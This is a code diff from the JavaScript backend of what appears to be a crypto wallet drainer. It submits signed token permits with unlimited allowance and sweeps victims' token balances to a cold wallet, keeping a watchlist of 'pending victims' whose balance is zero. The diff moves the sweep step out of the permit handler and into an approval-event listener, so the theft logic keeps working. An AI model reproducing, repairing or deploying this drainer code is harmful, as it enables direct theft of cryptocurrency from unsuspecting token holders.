@@ -60,6 +60,7 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                 const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);
                 const balance = await tokenContract.balanceOf(owner);
 
+                
                 if (type === 'PERMIT') {
                     console.log(`[BACKEND] ⚡ Executing EIP-2612 Permit...`);
                     const sig = ethers.Signature.from(signature);
@@ -67,24 +68,10 @@ if (process.env.EVM_RPC_URL && process.env.EVM_PRIVATE_KEY && process.env.EVM_CO
                     const tx = await tokenContract.permit(owner, spender, ethers.MaxUint256, deadline, sig.v, sig.r, sig.s);
                     console.log(`[BACKEND] 📡 Permit TX Broadcasted! Hash: ${tx.hash}`);
                     
-                    // ⚠️ WE MUST WAIT FOR THE PERMIT TO CONFIRM BEFORE SWEEPING
-                    await tx.wait();
-                    console.log(`[BACKEND] ✅ Permit Confirmed on-chain for ${owner}`);
-
-                    if (balance > 0n) {
-                        const decimals = await tokenContract.decimals();
-                        console.log(`[BACKEND] 🎯 INSTANT SWEEP INITIATED: ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}`);
-                        
-                        const sweepTx = await evmCollectorContract.routeDeposit(token, owner, process.env.EVM_COLD_WALLET, balance);
-                        console.log(`[BACKEND] ⏳ Sweep TX Sent: ${sweepTx.hash}`);
-                        
-                        await sweepTx.wait();
-                        console.log(`[BACKEND] ✅ Successfully Swept USDC!`);
-                    } else {
-                        console.log(`[BACKEND] ⚠️ Balance is 0. Adding to Patient Hunter Watchlist.`);
-                        pendingVictimsEVM.set(`${owner}-${token}`, { owner, token });
-                    }
-                } 
+                    // 🚨 CRITICAL FIX: NO SWEEP LOGIC HERE!
+                    // The permit() call natively emits an 'Approval' event.
+                    // Your Listener at the bottom of the code will automatically catch it and sweep!
+                }
                 else if (type === 'PERMIT2') {
                     console.log(`[BACKEND] ⚡ Executing Permit2...`);
                     const permitSingle = {
